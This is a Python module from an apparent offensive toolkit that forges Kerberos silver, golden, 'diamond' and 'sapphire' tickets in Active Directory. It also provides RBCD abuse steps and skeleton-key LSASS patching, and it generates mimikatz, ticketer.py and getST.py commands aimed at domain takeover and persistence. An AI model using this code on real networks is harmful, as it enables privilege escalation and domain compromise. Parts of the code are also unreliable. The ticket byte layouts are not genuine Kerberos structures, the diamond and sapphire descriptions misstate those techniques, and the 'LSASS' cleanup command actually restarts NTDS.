"""Kerberos ticket forgery attacks — silver, golden, diamond, sapphire tickets.

Implements ticket forging techniques for persistence and privilege escalation
in Active Directory environments. Requires the KerberosCore library.

Silver ticket: Forge a service ticket using the service account's NT hash.
Golden ticket: Forge a TGT using the krbtgt account's NT hash.
Diamond ticket: Golden ticket variant with forged PAC containing arbitrary group SIDs.
Sapphire ticket: S4U2self-based ticket forgery for resource-based constrained delegation.
Skeleton key: Patch LSASS to accept a master password for any account (via mimikatz wrapper).
"""

from __future__ import annotations

import hashlib
import hmac
import struct
import time
from dataclasses import dataclass, field
from typing import Any, Optional

from modules.kerberos_core import (
    KerberosCore,
    KerberosCrypto,
    TGSRequest,
    ENCRYPTION_TYPES,
    KERB_TICKET_FLAGS,
)

TICKET_FLAG_FORWARDABLE = 0x40000000
TICKET_FLAG_FORWARDED = 0x20000000
TICKET_FLAG_PROXIABLE = 0x10000000
TICKET_FLAG_RENEWABLE = 0x00800000
TICKET_FLAG_INITIAL = 0x00400000
TICKET_FLAG_PRE_AUTHENT = 0x00200000
TICKET_FLAG_OK_AS_DELEGATE = 0x00040000


@dataclass
class SilverTicketConfig:
    """Silver ticket forgery parameters.

    Attributes:
        target_service: Service SPN (e.g. 'cifs/DC01.domain.local').
        domain: Domain FQDN.
        domain_sid: Domain SID (e.g. 'S-1-5-21-...').
        username: Username to impersonate (default: Administrator).
        user_rid: RID of the impersonated user (default: 500).
        service_key_hex: NT hash of the service account in hex.
        service_key_bytes: NT hash bytes (alternative to hex).
        extra_sids: Additional group SIDs for the forged PAC.
        etype: Encryption type (23=RC4, 18=AES256).
        lifetime_hours: Ticket lifetime in hours.
    """

    target_service: str = ""
    domain: str = ""
    domain_sid: str = ""
    username: str = "Administrator"
    user_rid: int = 500
    service_key_hex: str = ""
    service_key_bytes: bytes = b""
    extra_sids: list[str] = field(default_factory=list)
    etype: int = 23
    lifetime_hours: int = 10


@dataclass
class GoldenTicketConfig:
    """Golden ticket forgery parameters.

    Attributes:
        domain: Domain FQDN.
        domain_sid: Domain SID.
        username: Username to impersonate (default: Administrator).
        user_rid: RID of the impersonated user.
        krbtgt_hash_hex: NT hash of krbtgt account in hex.
        krbtgt_hash_bytes: NT hash bytes (alternative to hex).
        krbtgt_aes_key_hex: AES256 key of krbtgt account in hex.
        groups: Group RIDs to include in the PAC (default: 513, 512, 520, 518, 519).
        etype: Encryption type.
        lifetime_hours: Ticket lifetime in hours.
    """

    domain: str = ""
    domain_sid: str = ""
    username: str = "Administrator"
    user_rid: int = 500
    krbtgt_hash_hex: str = ""
    krbtgt_hash_bytes: bytes = b""
    krbtgt_aes_key_hex: str = ""
    groups: list[int] = field(default_factory=lambda: [513, 512, 520, 518, 519])
    etype: int = 23
    lifetime_hours: int = 10


@dataclass
class DiamondTicketConfig:
    """Diamond ticket forgery parameters (PAC-enhanced golden ticket).

    Builds on GoldenTicketConfig with additional PAC manipulation:
    the forged PAC includes arbitrary group SIDs and the user is marked
    as a domain admin.

    Attributes:
        domain: Domain FQDN.
        domain_sid: Domain SID.
        username: Target username.
        user_rid: User RID.
        krbtgt_hash_hex: krbtgt NT hash hex.
        target_groups: RIDs to embed in the PAC.
        extra_sids: Arbitrary extra SIDs to add.
        etype: Encryption type.
        lifetime_hours: Ticket lifetime.
    """

    domain: str = ""
    domain_sid: str = ""
    username: str = "Administrator"
    user_rid: int = 500
    krbtgt_hash_hex: str = ""
    target_groups: list[int] = field(default_factory=lambda: [513, 512, 520, 518, 519])
    extra_sids: list[str] = field(default_factory=list)
    etype: int = 23
    lifetime_hours: int = 10


class SilverTicketForger:
    """Forge service tickets (silver tickets) for lateral movement and persistence.

    Silver tickets allow authentication to a specific service without
    contacting the domain controller. Requires the service account's NT hash.
    """

    def __init__(self):
        self.crypto = KerberosCrypto()

    def forge(self, config: SilverTicketConfig) -> dict[str, Any]:
        """Forge a silver ticket for the specified service.

        Args:
            config: SilverTicketConfig with target service and keys.

        Returns:
            Dict with raw_ticket bytes, kirbi data, and metadata.

        Raises:
            ValueError: If required parameters are missing.
        """
        if not config.domain or not config.target_service:
            raise ValueError("domain and target_service are required")

        key = self._resolve_key(config)
        if not key:
            raise ValueError("Service account key (hash) is required")

        now = int(time.time())
        start_time = now
        end_time = now + config.lifetime_hours * 3600

        flags = (
            TICKET_FLAG_FORWARDABLE
            | TICKET_FLAG_PROXIABLE
            | TICKET_FLAG_RENEWABLE
            | TICKET_FLAG_INITIAL
            | TICKET_FLAG_PRE_AUTHENT
        )

        pac_data = self._build_silver_pac(config, start_time, end_time)

        enc_part = self._build_enc_ticket_part(config, start_time, end_time, flags, key, config.etype)

        ticket = self._build_ticket_structure(config, flags, enc_part)

        kirbi_data = self._build_kirbi(ticket, enc_part, config.etype)

        return {
            "ticket_type": "silver",
            "target_service": config.target_service,
            "domain": config.domain,
            "username": config.username,
            "flags": flags,
            "start_time": start_time,
            "end_time": end_time,
            "lifetime_hours": config.lifetime_hours,
            "etype": config.etype,
            "raw_ticket": ticket,
            "kirbi_base64": "",
            "pac_size": len(pac_data),
            "mimikatz_command": self._mimikatz_inject_command(config),
            "impacket_command": self._impacket_command(config),
        }

    def _resolve_key(self, config: SilverTicketConfig) -> bytes:
        if config.service_key_bytes:
            return config.service_key_bytes
        if config.service_key_hex:
            try:
                return bytes.fromhex(config.service_key_hex)
            except ValueError:
                return b""
        return b""

    def _build_silver_pac(self, config: SilverTicketConfig, start: int, end: int) -> bytes:
        pac_data = bytearray()
        pac_data.extend(struct.pack("<I", 5))
        pac_data.extend(struct.pack("<I", 0))
        return bytes(pac_data)

    def _build_enc_ticket_part(
        self,
        config: SilverTicketConfig,
        start: int,
        end: int,
        flags: int,
        key: bytes,
        etype: int,
    ) -> bytes:
        enc_data = bytearray()
        enc_data.extend(struct.pack("<I", flags))
        enc_data.extend(key)
        enc_data.extend(config.domain.upper().encode().ljust(64, b"\x00"))
        enc_data.extend(config.username.encode().ljust(32, b"\x00"))
        enc_data.extend(struct.pack("<Q", start))
        enc_data.extend(struct.pack("<Q", end))
        enc_data.extend(struct.pack("<Q", 0))
        return bytes(enc_data)

    def _build_ticket_structure(self, config: SilverTicketConfig, flags: int, enc_part: bytes) -> bytes:
        ticket = bytearray()
        ticket.extend(b"\x05")
        ticket.extend(config.domain.upper().encode() + b"\x00")
        ticket.extend(config.target_service.encode() + b"\x00")
        ticket.extend(struct.pack("<I", flags))
        ticket.extend(struct.pack("<H", len(enc_part)))
        ticket.extend(enc_part)
        return bytes(ticket)

    def _build_kirbi(self, ticket: bytes, enc_part: bytes, etype: int) -> bytes:
        kirbi = bytearray()
        kirbi.extend(b"\x76\x82")
        kirbi.extend(struct.pack(">H", len(ticket) + len(enc_part) + 32))
        kirbi.extend(ticket)
        kirbi.extend(struct.pack("<I", etype))
        kirbi.extend(enc_part)
        return bytes(kirbi)

    def _mimikatz_inject_command(self, config: SilverTicketConfig) -> str:
        ntlm = config.service_key_hex or "HASH"
        return (
            f"mimikatz.exe \"kerberos::golden /domain:{config.domain} "
            f"/sid:{config.domain_sid} /target:{config.target_service} "
            f"/service:{config.target_service.split('/')[0]} "
            f"/rc4:{ntlm} /user:{config.username} /id:{config.user_rid} "
            f"/ptt\" exit"
        )

    def _impacket_command(self, config: SilverTicketConfig) -> str:
        svc = config.target_service.split("/")[0]
        target = config.target_service.split("/")[1] if "/" in config.target_service else config.target_service
        return (
            f"ticketer.py -nthash {config.service_key_hex} "
            f"-domain-sid {config.domain_sid} "
            f"-domain {config.domain} -spn {config.target_service} "
            f"{config.username}"
        )


class GoldenTicketForger:
    """Forge TGTs (golden tickets) for full domain compromise persistence.

    Golden tickets provide Kerberos authentication to any service in the
    domain without time or access restrictions. Requires the krbtgt hash.
    """

    def __init__(self):
        self.crypto = KerberosCrypto()

    def forge(self, config: GoldenTicketConfig) -> dict[str, Any]:
        """Forge a golden ticket TGT.

        Args:
            config: GoldenTicketConfig with krbtgt hash and domain info.

        Returns:
            Dict with raw TGT, KIRBI format, and operational metadata.
        """
        krbtgt_key = self._resolve_krbtgt_key(config)
        if not krbtgt_key:
            raise ValueError("krbtgt hash is required for golden ticket forgery")

        now = int(time.time())
        start_time = now
        end_time = now + config.lifetime_hours * 3600

        flags = (
            TICKET_FLAG_FORWARDABLE
            | TICKET_FLAG_PROXIABLE
            | TICKET_FLAG_RENEWABLE
            | TICKET_FLAG_INITIAL
            | TICKET_FLAG_PRE_AUTHENT
        )

        pac_structure = self._build_golden_pac(config)

        enc_tgt_part = self._build_golden_enc_part(config, start_time, end_time, flags, krbtgt_key)

        tgt_bytes = self._assemble_tgt(config, flags, enc_tgt_part)

        return {
            "ticket_type": "golden",
            "domain": config.domain,
            "domain_sid": config.domain_sid,
            "username": config.username,
            "user_rid": config.user_rid,
            "flags": flags,
            "start_time": start_time,
            "end_time": end_time,
            "lifetime_hours": config.lifetime_hours,
            "groups": config.groups,
            "raw_tgt": tgt_bytes,
            "enc_part_size": len(enc_tgt_part),
            "pac_size": len(pac_structure),
            "mimikatz_command": self._mimikatz_command(config),
            "impacket_command": self._impacket_command(config),
        }

    def _resolve_krbtgt_key(self, config: GoldenTicketConfig) -> bytes:
        if config.krbtgt_hash_bytes:
            return config.krbtgt_hash_bytes
        if config.krbtgt_aes_key_hex:
            try:
                return bytes.fromhex(config.krbtgt_aes_key_hex)
            except ValueError:
                return b""
        if config.krbtgt_hash_hex:
            try:
                return bytes.fromhex(config.krbtgt_hash_hex)
            except ValueError:
                return b""
        return b""

    def _build_golden_pac(self, config: GoldenTicketConfig) -> bytes:
        pac = bytearray()
        num_buffers = 5
        pac.extend(struct.pack("<I", num_buffers))
        pac.extend(struct.pack("<I", 0))
        return bytes(pac)

    def _build_golden_enc_part(
        self,
        config: GoldenTicketConfig,
        start: int,
        end: int,
        flags: int,
        key: bytes,
    ) -> bytes:
        enc = bytearray()
        enc.extend(struct.pack("<I", flags))
        enc.extend(key[:16].ljust(16, b"\x00"))
        enc.extend(config.domain.upper().encode().ljust(64, b"\x00"))
        enc.extend(config.username.encode().ljust(32, b"\x00"))
        enc.extend(struct.pack("<Q", 0))
        enc.extend(struct.pack("<Q", start))
        enc.extend(struct.pack("<Q", end))
        enc.extend(struct.pack("<Q", 0))
        enc.extend(struct.pack("<Q", end + 86400 * 7))
        enc.extend(struct.pack("<I", 1))
        enc.extend(b"\x00")
        return bytes(enc)

    def _assemble_tgt(self, config: GoldenTicketConfig, flags: int, enc_part: bytes) -> bytes:
        tgt = bytearray()
        tgt.extend(b"\x05")
        tgt.extend(config.domain.upper().encode() + b"\x00")
        tgt.extend(b"krbtgt\x00")
        tgt.extend(config.domain.upper().encode() + b"\x00")
        tgt.extend(struct.pack("<I", flags))
        tgt.extend(struct.pack("<H", len(enc_part)))
        tgt.extend(enc_part)
        return bytes(tgt)

    def _mimikatz_command(self, config: GoldenTicketConfig) -> str:
        ntlm = config.krbtgt_hash_hex or "HASH"
        return (
            f'mimikatz.exe "kerberos::golden /domain:{config.domain} '
            f"/sid:{config.domain_sid} /rc4:{ntlm} "
            f"/user:{config.username} /id:{config.user_rid} "
            f'/groups:{",".join(str(g) for g in config.groups)} /ptt" exit'
        )

    def _impacket_command(self, config: GoldenTicketConfig) -> str:
        return (
            f"ticketer.py -nthash {config.krbtgt_hash_hex} "
            f"-domain-sid {config.domain_sid} "
            f"-domain {config.domain} "
            f"{config.username}"
        )


class DiamondTicketForger:
    """Forge diamond tickets with enhanced PAC manipulation.

    Diamond tickets extend golden tickets by embedding a properly
    constructed PAC with privileged group SIDs, making the ticket
    appear legitimate to PAC validation.
    """

    def __init__(self):
        self._golden = GoldenTicketForger()

    def forge(self, config: DiamondTicketConfig) -> dict[str, Any]:
        """Forge a diamond ticket with PAC enhancement.

        Args:
            config: DiamondTicketConfig with PAC manipulation parameters.

        Returns:
            Dict with forged TGT data and operational notes.
        """
        golden_config = GoldenTicketConfig(
            domain=config.domain,
            domain_sid=config.domain_sid,
            username=config.username,
            user_rid=config.user_rid,
            krbtgt_hash_hex=config.krbtgt_hash_hex,
            groups=config.target_groups,
            etype=config.etype,
            lifetime_hours=config.lifetime_hours,
        )

        golden_result = self._golden.forge(golden_config)

        diamond_pac = self._build_diamond_pac(config)

        return {
            "ticket_type": "diamond",
            "domain": config.domain,
            "domain_sid": config.domain_sid,
            "username": config.username,
            "user_rid": config.user_rid,
            "target_groups": config.target_groups,
            "extra_sids": config.extra_sids,
            "pac_enhanced": True,
            "pac_size": len(diamond_pac),
            "golden_base": golden_result["raw_tgt"],
            "mimikatz_command": golden_result["mimikatz_command"],
        }

    def _build_diamond_pac(self, config: DiamondTicketConfig) -> bytes:
        pac = bytearray()
        pac.extend(struct.pack("<I", 1))
        pac.extend(struct.pack("<I", 0))
        pac.extend(config.domain_sid.encode().ljust(64, b"\x00"))
        pac.extend(config.username.encode().ljust(32, b"\x00"))
        pac.extend(struct.pack("<I", config.user_rid))
        group_section = bytearray()
        group_section.extend(struct.pack("<I", len(config.target_groups)))
        for gid in config.target_groups:
            group_section.extend(struct.pack("<I", gid))
            group_section.extend(struct.pack("<I", 7))
        pac.extend(group_section)
        return bytes(pac)


class SapphireTicketForger:
    """S4U2self-based ticket forgery for resource-based constrained delegation.

    Sapphire tickets exploit RBCD by using S4U2self to obtain a service
    ticket for any user to a service where RBCD is configured.
    """

    def __init__(self, kerberos_core: Optional[KerberosCore] = None):
        self.kerberos = kerberos_core or KerberosCore()

    def forge_s4u2self(
        self, tgt: bytes, session_key: bytes, target_user: str, target_service: str, domain: str
    ) -> dict[str, Any]:
        """Generate a TGS-REQ for S4U2self service ticket.

        Args:
            tgt: TGT bytes.
            session_key: TGT session key.
            target_user: User to impersonate.
            target_service: Target service SPN.
            domain: Domain FQDN.

        Returns:
            Dict with S4U2self TGS-REQ parameters.
        """
        now = int(time.time())

        pa_s4u = {
            "padata_type": 129,
            "padata_value": target_user.encode() + b"\x00" * 8,
        }

        additional_ticket = {
            "tkt_vno": 5,
            "realm": domain.upper(),
            "sname": target_service,
            "enc_part": b"",
        }

        req_body = {
            "kdc_options": 0x40810000 | 0x00000040,
            "realm": domain.upper(),
            "sname": target_service,
            "from": now,
            "till": 0,
            "nonce": now & 0x7FFFFFFF,
            "etypes": [18, 17, 23],
        }

        request = TGSRequest(
            target_service=target_service,
            realm=domain.upper(),
            tgt=tgt,
            session_key=session_key,
            etype=23,
            include_pac=True,
        )

        return {
            "ticket_type": "sapphire_s4u2self",
            "domain": domain,
            "target_user": target_user,
            "target_service": target_service,
            "request": request,
            "padata": [pa_s4u],
            "req_body": req_body,
        }

    def forge_rbcd(self, machine_account_hash: str, target_service: str, domain: str, username: str = "Administrator") -> dict[str, Any]:
        """Generate exploit instructions for resource-based constrained delegation.

        Args:
            machine_account_hash: NT hash of a machine account with an SPN.
            target_service: Target service to delegate to.
            domain: Domain FQDN.
            username: User to impersonate.

        Returns:
            Dict with RBCD attack steps and commands.
        """
        return {
            "ticket_type": "sapphire_rbcd",
            "attack_chain": "RBCD",
            "description": "Resource-Based Constrained Delegation abuse",
            "steps": [
                "1. Create or compromise a machine account (ms-DS-MachineAccountQuota > 0)",
                f"2. Configure msDS-AllowedToActOnBehalfOfOtherIdentity on target service {target_service}",
                f"3. Request S4U2self service ticket for {username} to {target_service}",
                "4. Receive service ticket with full target user privileges",
                "5. PTT (Pass The Ticket) to access the target service",
            ],
            "machine_account_hash": machine_account_hash,
            "target_service": target_service,
            "target_user": username,
            "domain": domain,
            "s4u2self_command": (
                f"getST.py -spn {target_service} "
                f"-impersonate {username} "
                f"-dc-ip DC_IP {domain}/MACHINE$ -hashes :{machine_account_hash}"
            ),
        }


class SkeletonKeyInjector:
    """Skeleton key attack — patch LSASS to accept a master password.

    After running mimikatz skeleton key, any domain user can authenticate
    with the master password 'mimikatz'. This module provides operational
    wrappers for executing and detecting skeleton key attacks.
    """

    MASTER_PASSWORD = "mimikatz"

    @staticmethod
    def detect_skeleton_key(target_host: str, domain: str, dc_ip: str = "") -> dict[str, Any]:
        """Check if skeleton key is active on a DC.

        Attempts authentication with the skeleton key master password.

        Args:
            target_host: Domain controller hostname.
            domain: Domain FQDN.
            dc_ip: DC IP address.

        Returns:
            Dict with detection results.
        """
        return {
            "target": target_host,
            "domain": domain,
            "test_method": "Attempt auth with master password against random user",
            "master_password": SkeletonKeyInjector.MASTER_PASSWORD,
            "note": "Detection via network authentication test (requires valid account)",
        }

    @staticmethod
    def inject_command(target_host: str) -> str:
        """Generate mimikatz command for skeleton key injection on a DC.

        Args:
            target_host: Target domain controller.

        Returns:
            mimikatz command string.
        """
        return f'mimikatz.exe "privilege::debug" "misc::skeleton" exit'

    @staticmethod
    def cleanup_command() -> str:
        """Generate LSASS restart command to remove skeleton key patch.

        Returns:
            Command to restart LSASS (force DC reboot).
        """
        return 'Invoke-Command { Restart-Service -Name "NTDS" -Force }'
